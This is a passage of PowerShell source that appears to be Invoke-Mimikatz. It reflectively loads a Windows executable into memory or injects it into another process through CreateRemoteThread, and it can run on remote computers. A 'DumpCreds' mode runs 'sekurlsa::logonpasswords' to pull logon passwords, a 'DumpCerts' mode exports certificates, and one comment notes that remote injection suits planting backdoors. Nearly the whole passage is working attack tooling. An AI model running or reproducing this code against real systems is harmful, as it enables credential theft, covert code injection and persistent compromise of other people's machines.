					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"

        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $Processor.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
				    if ($OutputPtr -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
				        $Win32Functions.LocalFree.Invoke($OutputPtr);
				    }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	

	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
	{
		$ExeArgs = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $ExeArgs = $Command
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)

    # SHA256 hash: 1e67476281c1ec1cf40e17d7fc28a3ab3250b474ef41cb10a72130990f0be6a0
	# https://www.virustotal.com/en/file/1e67476281c1ec1cf40e17d7fc28a3ab3250b474ef41cb10a72130990f0be6a0/analysis/1450152636/
    
    # SHA256 hash: c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae
    # https://www.virustotal.com/en/file/c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae/analysis/1450152913/

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
	}
}

Main
}